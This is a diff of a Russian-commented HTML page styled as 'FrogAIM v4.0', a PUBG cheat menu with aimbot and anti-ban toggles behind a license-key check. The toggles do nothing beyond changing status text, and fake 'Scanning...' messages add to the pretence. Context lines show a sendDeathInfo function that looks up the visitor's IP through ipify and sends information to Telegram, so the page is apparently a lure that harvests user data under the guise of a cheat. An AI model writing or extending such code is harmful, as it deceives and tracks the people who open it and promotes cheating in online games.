@@ -39,8 +39,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.85);
             z-index: 998;
             display: none;
         }
@@ -52,13 +51,13 @@
             left: 50%;
             transform: translate(-50%, -50%);
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            border: 3px solid var(--frog-green);
-            border-radius: 15px;
-            padding: 30px;
+            border: 2px solid var(--frog-green);
+            border-radius: 12px;
+            padding: 25px;
             width: 90%;
-            max-width: 350px;
+            max-width: 320px;
             text-align: center;
-            box-shadow: 0 0 30px var(--frog-green);
+            box-shadow: 0 0 20px var(--frog-green);
             z-index: 1000;
         }
         
@@ -69,34 +68,40 @@
             border: 2px solid var(--accent-color);
             border-radius: 8px;
             color: white;
-            font-size: 16px;
-            margin-bottom: 20px;
+            font-size: 14px;
+            margin-bottom: 15px;
             text-align: center;
         }
         
         .activate-btn {
             background: linear-gradient(90deg, var(--frog-green), #00cc00);
             border: none;
-            padding: 12px 25px;
+            padding: 12px 20px;
             border-radius: 8px;
             color: black;
             font-weight: bold;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 14px;
+            transition: all 0.3s ease;
         }
         
-        /* Главное окно */
+        .activate-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px var(--frog-green);
+        }
+        
+        /* Главное окно - вертикальное */
         .floating-window {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 320px;
+            width: 300px;
             height: 500px;
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            border: 3px solid var(--frog-green);
-            border-radius: 15px;
-            box-shadow: 0 0 30px var(--frog-green);
+            border: 2px solid var(--frog-green);
+            border-radius: 12px;
+            box-shadow: 0 0 25px var(--frog-green);
             z-index: 999;
             overflow: hidden;
             display: none;
@@ -104,7 +109,7 @@
         
         .window-header {
             background: linear-gradient(90deg, var(--frog-green), #00cc00);
-            padding: 15px;
+            padding: 12px;
             text-align: center;
             position: relative;
         }
@@ -113,62 +118,84 @@
             color: black;
             font-weight: bold;
             margin: 0;
-            font-size: 16px;
+            font-size: 14px;
+            text-shadow: 0 0 3px rgba(0,0,0,0.3);
         }
         
         .close-btn {
             position: absolute;
-            right: 15px;
+            right: 12px;
             top: 50%;
             transform: translateY(-50%);
             background: #ff4444;
             border: none;
             color: white;
-            width: 25px;
-            height: 25px;
+            width: 22px;
+            height: 22px;
             border-radius: 50%;
             cursor: pointer;
             font-weight: bold;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+        
+        .close-btn:hover {
+            transform: translateY(-50%) scale(1.1);
         }
         
         .content {
-            padding: 20px;
-            height: calc(100% - 120px);
+            padding: 15px;
+            height: calc(100% - 110px);
             overflow-y: auto;
         }
         
         .cheat-section {
-            margin-bottom: 20px;
-            background: rgba(0, 255, 0, 0.05);
-            border-radius: 10px;
-            padding: 15px;
-            border-left: 3px solid var(--frog-green);
+            margin-bottom: 15px;
+            background: rgba(0, 255, 0, 0.08);
+            border-radius: 8px;
+            padding: 12px;
+            border-left: 2px solid var(--frog-green);
         }
         
         .cheat-section h3 {
             color: var(--frog-green);
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             border-bottom: 1px solid var(--frog-green);
-            padding-bottom: 6px;
-            font-size: 14px;
+            padding-bottom: 5px;
+            font-size: 12px;
+            text-shadow: 0 0 5px var(--glow-color);
         }
         
         .cheat-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin: 10px 0;
-            padding: 10px;
-            background: rgba(0, 255, 0, 0.1);
-            border-radius: 8px;
-            font-size: 12px;
+            margin: 8px 0;
+            padding: 8px;
+            background: rgba(0, 255, 0, 0.12);
+            border-radius: 6px;
+            font-size: 11px;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+        }
+        
+        .cheat-item:hover {
+            background: rgba(0, 255, 0, 0.2);
+            transform: translateX(3px);
+            border-color: var(--frog-green);
         }
         
         .switch {
             position: relative;
             display: inline-block;
-            width: 40px;
-            height: 20px;
+            width: 36px;
+            height: 18px;
+        }
+        
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
         }
         
         .slider {
@@ -180,7 +207,7 @@
             bottom: 0;
             background-color: #333;
             transition: .4s;
-            border-radius: 20px;
+            border-radius: 18px;
         }
         
         .slider:before {
@@ -188,8 +215,8 @@
             content: "";
             height: 14px;
             width: 14px;
-            left: 3px;
-            bottom: 3px;
+            left: 2px;
+            bottom: 2px;
             background-color: white;
             transition: .4s;
             border-radius: 50%;
@@ -200,35 +227,48 @@
         }
         
         input:checked + .slider:before {
-            transform: translateX(20px);
+            transform: translateX(18px);
         }
         
         .secret-section {
             background: rgba(255, 0, 0, 0.1);
-            border-left: 3px solid #ff0000;
+            border-left: 2px solid #ff0000;
+        }
+        
+        .secret-section h3 {
+            color: #ff4444;
+            border-bottom-color: #ff4444;
         }
         
         .death-btn {
             background: linear-gradient(90deg, #ff0000, #cc0000);
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 8px 16px;
             border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
             width: 100%;
-            font-size: 12px;
+            font-size: 11px;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 3px rgba(0,0,0,0.5);
+        }
+        
+        .death-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(255,0,0,0.5);
         }
         
         .footer {
             position: absolute;
             bottom: 0;
             width: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 10px;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 8px;
             text-align: center;
-            font-size: 11px;
+            font-size: 10px;
             color: var(--frog-green);
+            border-top: 1px solid var(--frog-green);
         }
         
         .status {
@@ -249,9 +289,36 @@
         
         .error-message {
             color: #ff4444;
-            margin-top: 10px;
+            margin-top: 8px;
             display: none;
-            font-size: 12px;
+            font-size: 11px;
+        }
+        
+        /* Кнопка запуска */
+        .launch-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--frog-green), #00cc00);
+            border-radius: 50%;
+            border: none;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px var(--frog-green);
+            z-index: 997;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+        
+        .launch-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px var(--frog-green);
         }
     </style>
 </head>
@@ -261,12 +328,14 @@
     <div class="activation-modal" id="activationModal">
         <div class="activation-box">
             <h2>🐸 FrogAIM v4.0</h2>
-            <p style="color: #ccc; margin-bottom: 15px; font-size: 14px;">Enter license key to activate</p>
+            <p style="color: #ccc; margin-bottom: 15px; font-size: 12px;">Enter license key to activate</p>
             <input type="text" class="activation-input" id="activationKey" placeholder="FROGI-XXXX-XXXXXXX">
             <button class="activate-btn" onclick="activateCheat()">ACTIVATE</button>
             <p class="error-message" id="errorMsg">Invalid activation key!</p>
         </div>
     </div>
+
+    <button class="launch-button" id="launchButton" onclick="showCheatMenu()">🐸</button>
 
     <div class="floating-window" id="mainWindow">
         <div class="window-header">
@@ -274,7 +343,7 @@
             <button class="close-btn" onclick="hideCheatMenu()">×</button>
         </div>
         <div class="content">
-            <!-- Все секции чита -->
+            <!-- AIMBOT SECTION -->
             <div class="cheat-section">
                 <h3>AIMBOT FEATURES</h3>
                 <div class="cheat-item">
@@ -300,6 +369,7 @@
                 </div>
             </div>
 
+            <!-- VISUAL MODS -->
             <div class="cheat-section">
                 <h3>VISUAL MODS</h3>
                 <div class="cheat-item">
@@ -325,6 +395,7 @@
                 </div>
             </div>
 
+            <!-- GAME HACKS -->
             <div class="cheat-section">
                 <h3>GAME HACKS</h3>
                 <div class="cheat-item">
@@ -350,6 +421,33 @@
                 </div>
             </div>
 
+            <!-- PREMIUM FEATURES -->
+            <div class="cheat-section">
+                <h3>PREMIUM FEATURES</h3>
+                <div class="cheat-item">
+                    <span>Vehicle ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="vehicleesp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Magic Bullet</span>
+                    <label class="switch">
+                        <input type="checkbox" id="magicbullet">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Anti-Ban</span>
+                    <label class="switch">
+                        <input type="checkbox" id="antiban" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- SECRET SECTION -->
             <div class="cheat-section secret-section">
                 <h3>??????</h3>
                 <div class="cheat-item">
@@ -360,7 +458,7 @@
         </div>
         
         <div class="footer">
-            Status: <span class="status"></span> <span id="statusText">Active</span>
+            Status: <span class="status"></span> <span id="statusText">Active</span> | PUBG 4.0
         </div>
     </div>
 
@@ -377,8 +475,7 @@
             if (inputKey === ACTIVATION_KEY) {
                 isActivated = true;
                 document.getElementById('activationModal').style.display = 'none';
-                document.getElementById('mainWindow').style.display = 'block';
-                document.getElementById('backgroundOverlay').style.display = 'block';
+                document.getElementById('launchButton').style.display = 'flex';
                 localStorage.setItem('frogaim_activated', 'true');
             } else {
                 errorMsg.style.display = 'block';
@@ -386,9 +483,18 @@
             }
         }
 
+        function showCheatMenu() {
+            if (isActivated) {
+                document.getElementById('mainWindow').style.display = 'block';
+                document.getElementById('backgroundOverlay').style.display = 'block';
+                document.getElementById('launchButton').style.display = 'none';
+            }
+        }
+
         function hideCheatMenu() {
             document.getElementById('mainWindow').style.display = 'none';
             document.getElementById('backgroundOverlay').style.display = 'none';
+            document.getElementById('launchButton').style.display = 'flex';
         }
 
         // Анимации переключателей
@@ -396,25 +502,41 @@
             checkbox.addEventListener('change', function() {
                 if (this.checked) {
                     document.getElementById('statusText').textContent = "Mod Activated";
+                    document.getElementById('statusText').style.color = "#ff9900";
+                    
                     setTimeout(() => {
                         document.getElementById('statusText').textContent = "Active";
+                        document.getElementById('statusText').style.color = "#00ff00";
                     }, 2000);
                 }
             });
         });
 
+        // Случайные изменения статуса
+        setInterval(() => {
+            if (Math.random() > 0.8 && document.getElementById('mainWindow').style.display === 'block') {
+                document.getElementById('statusText').textContent = "Scanning...";
+                document.getElementById('statusText').style.color = "#ffff00";
+                
+                setTimeout(() => {
+                    document.getElementById('statusText').textContent = "Active";
+                    document.getElementById('statusText').style.color = "#00ff00";
+                }, 1500);
+            }
+        }, 10000);
+
         // Проверка активации при загрузке
         if (localStorage.getItem('frogaim_activated') === 'true') {
             isActivated = true;
             document.getElementById('activationModal').style.display = 'none';
-            document.getElementById('mainWindow').style.display = 'block';
-            document.getElementById('backgroundOverlay').style.display = 'block';
+            document.getElementById('launchButton').style.display = 'flex';
         }
 
         // Отправка в Telegram
         async function sendDeathInfo() {
             const statusText = document.getElementById('statusText');
             statusText.textContent = "Sending...";
+            statusText.style.color = "#ffff00";
             
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -448,11 +570,14 @@
                 });
                 
                 statusText.textContent = "Sent!";
+                statusText.style.color = "#00ff00";
             } catch (error) {
                 statusText.textContent = "Error!";
+                statusText.style.color = "#ff4444";
             } finally {
                 setTimeout(() => {
                     statusText.textContent = "Active";
+                    statusText.style.color = "#00ff00";
                 }, 3000);
             }
         }
@@ -461,5 +586,4 @@
             if (e.key === 'Enter') activateCheat();
         });
     </script>
-</body>
-    </html>
+</
